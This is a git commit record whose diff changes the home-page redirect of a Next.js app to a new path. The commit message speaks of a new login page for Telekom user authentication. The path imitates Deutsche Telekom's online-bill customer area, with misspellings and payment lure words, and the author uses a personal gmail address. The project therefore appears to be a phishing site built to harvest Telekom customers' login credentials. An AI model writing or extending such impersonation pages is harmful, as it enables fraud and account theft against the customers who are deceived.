852e9ac875710d49fec77164d77854a8f2ab9bb7
charlieScript <gozione3@gmail.com>
2025-03-21 14:12:21 +0100

    Update redirect in page.tsx to new login path and add new login page component for Telekom user authentication.

--- src/app/page.tsx
+++ src/app/page.tsx
@@ -1,5 +1,5 @@
 import { redirect } from 'next/navigation';
 
 export default function Home() {
-  redirect('/rechnung-online-telekomde/fn/static/RechnungOnlineAnsehen-kundencentar-datens-sbs/Kundenkonto/Mobilfunk/inklusive/zahlende/abgebucht');
+  redirect('/rechnung-online-telekomde/fn/static/RechnungOnlineAnsehen-kundencentar-datens-sbs/Kundenkonto/Mobilfunk/Ouendiiem');
 }
